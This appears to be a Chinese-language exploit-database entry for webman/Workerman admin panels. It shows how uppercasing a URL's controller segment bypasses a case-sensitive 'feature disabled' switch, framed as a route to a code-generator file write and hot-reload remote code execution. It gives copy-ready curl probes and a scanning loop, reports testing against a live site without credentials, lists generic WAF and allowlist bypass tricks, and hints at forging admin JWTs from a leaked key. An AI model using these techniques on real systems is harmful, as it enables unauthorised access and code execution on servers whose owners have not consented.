# webman 路由大小写不敏感 → 绕过按路径控制器段精确匹配的「功能关闭」开关（可救回代码生成器写文件 → Monitor 热重载 RCE）

- **code**: webman-路由大小写不敏感-绕过按路径精确匹配的-功能关闭-开关-可救回代码生成器写文件-monitor-热重载-rce
- **kind**: script
- **category**: auth-bypass
- **versions**: webman（Workerman）全系；webman-admin 0.6.x（TableController 代码生成器）
- **severity**: medium
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 在 example.com（webman + Pear Admin 后台）实测 12 组对照：`table/select`→403 开关；`table/SELECT`→**仍 403 开关**（开关只看控制器段）；`TABLE/select`、`TABLE/SELECT`、`TABLE/index`、`PLUGIN/INDEX`→200 `<script>top.location.href='/app/admin';</script>`（开关被绕，落 AccessControl 401 分支，该脚本出自 plugin/admin/app/middleware/target356.example.com:58）；`account/info`（非开关管辖）同为 401 脚本可作判据；`TABLE/zznotexistact`→not found（绕过后不存在的动作仍失败）；**反例**：`/app/admin/api/im/group/LIST`、`/app/admin/api/IM/group/list`（4 段式）→not found，`/app/admin/dev/FORM-BUILD`→仍 403 开关 ⇒ 绕过只对 2 段式成立。无需任何凭证即可复现。落库靶标 vuln_id=11、HTTP 证据 id=8、chain seq=25/29。
- **path**: pocs/webman-路由大小写不敏感-绕过按路径精确匹配的-功能关闭-开关-可救回代码生成器写文件-monitor-热重载-rce/poc.sh
- **tags**: webman,workerman,路由,大小写绕过,WAF绕过,功能开关,代码生成器,file_put_contents,热重载,RCE
- **created_at**: 2026-10-12T10:42:25.104Z
- **found_by**: exploit

## 描述

webman/Workerman 系 CMS 的「功能开关」常按 $request->path() 的控制器段做大小写敏感匹配，而 Web 路由分发对控制器段大小写不敏感 ⇒ 把控制器段写成大写（/app/admin/TABLE/select、/app/admin/PLUGIN/index）即可让开关失效，进入后台插件鉴权链。在目标上这条绕过把代码生成器（file_put_contents 写 app/controller → Monitor 热重载）从“已封死”救回“只差管理员会话”。含基线/变体/交叉验证三段探测命令与适用范围反例。

## 用法

```
1) 本机在 Clash fake-ip 环境时 curl 需加 `-x http://127.0.0.1:7892 --connect-to TARGET:443:203.0.113.95:443`；2) 先跑基线确认开关响应文案，再只把**控制器段**改大写（动作段改大小写无效，实测 table/SELECT 仍被拦）；3) 交叉验证：非开关管辖路由的同类变体响应应与原路径完全一致，不存在动作的变体应仍 not found（排除万能放行）；4) 适用范围：2 段式 `/{插件}/{控制器}/{动作}` 有效，4 段式 `/app/admin/api/*` 无效（换大小写直接 not found），dev/* 因前缀匹配也无效；5) 绕过后若落 401，说明只绕过了开关、还需鉴权（webman-admin 前后台共用 HS256 JWT 密钥时，拿到密钥即可伪造 admin token）。
```

## 正文

```
# 通用技巧：webman（workerman 系）路由大小写不敏感 × 业务侧「功能开关/路径黑名单」按精确路径匹配 ⇒ 大小写变体绕过开关

## 原理
1. webman/Workerman 的路由匹配对 URI 路径**大小写不敏感**：`/app/admin/TABLE/SELECT` 与 `/app/admin/table/select` 都能分发到 `TableController::select()`。
   - 验证方法：请求一个不存在的方法名，若仍返回 404 的 “xxx not found” 且大小写da小写都能命中/都不命中，说明路由表按不敏感匹配；
   - 交叉验证：把**不受开关管辖**的路由也换大小写（如 `/app/admin/Account/Info`），若返回与原始路径完全相同的响应（这里是 `<script>top.location.href='/app/admin';</script>`），即可确认“大小写变体走的是同一条原路由”，而不是另注册了假路由。
2. 很多运营方会在部署版加一层「功能未开放」的开关（典型响应：HTTP 200 + `{"code":403,"message":"该功能正在进行中，默认关闭"}`），实现方式通常是中间件里对 `$request->path()` 做 `in_array`/精确 `str_starts_with` 判断。**这种判断区分大小写**，于是绕过的钥匙就是 URI 大小写。
3. 注意实现不一致：同一站点里可能有的组是「按 action 精确匹配」（可绕）、有的组是「按前缀匹配」（`/app/admin/dev/` 那组大小写都拦）。**必须逐条实测，不能假设整站可绕。**

## 探测命令（照抄即可）
```bash
# 基线：小写（命中开关）
curl -sk -o- https://TARGET/app/admin/table/select
#   期望：{"code":403,"message":"该功能正在进行中，默认关闭"}

# 绕过：大写 / 混合大小写
curl -sk -o- https://TARGET/app/admin/TABLE/SELECT
curl -sk -o- https://TARGET/app/admin/Table/Select
#   期望：不再是开关那句 JSON，而是下一层（鉴权 401 / 业务 500 / 真实数据）

# 同族把开关管的其它组一起试
for p in plugin/index plugin/install dev/form-build im/group/list monitor/server maintenance/task/list; do
  for v in "$p" "$(echo $p | tr 'a-z' 'A-Z')"; do
    printf '%-28s ' "$v"; curl -sk -o- "https://TARGET/app/admin/$v" | head -c 120; echo
  done
done

# 交叉验证（排除“假路由”误判）：换一条不受开关管辖的路由的大小写
curl -sk -o- https://TARGET/app/admin/Account/Info   # 与 /app/admin/account/info 响应应完全一致
# 路由存在性对照
curl -sk -o- https://TARGET/app/admin/TABLE/nonexistentxyz   # 期望："/app/admin/TABLE/nonexistentxyz not found"
```

## 为什么值得绕：把开关背后的写文件原语救回来
webman-admin 的代码生成器 `plugin/admin/app/controller/TableController.php` 里
`createController()` / `createModel()` 直接 `file_put_contents($file, ...)` 写 **`app/controller/*.php` 与 model 文件**，
而 webman 的 `config/process.php` Monitor 进程**监听 `app/`、`config/`、`plugin/*/{app,config,api}` 并热重载**：
只要能到达生成器的写动作（`/app/admin/table/crud`、`/app/admin/table/create|modify`），就是**一条 file_put_contents → 热重载 → RCE** 的路，
比上传马/写 config 更直接。运营方常用“功能关闭”开关掩盖这条入口，大小写即可绕过开关（鉴权仍要自己解决）。

## 同类场景迁移
- ThinkPHP / Laravel / Spring 的路由都不区分 URL 大小写（Spring 默认 PathPattern 区分大小写，需实测）；
- 任何“按 `$request->path()` 精确匹配”的自研 WAF / 鉴权白名单 / 功能开关，都优先试：大小写、`//`、`/./`、末尾 `/`、`%2f`、`;`、`%20`；
- 探测思路固定为三步：**① 基线（开关响应）→ ② 变体（是否换响应）→ ③ 交叉验证（非开关路由的同类变体响应是否一致，排除假路由）**。

```
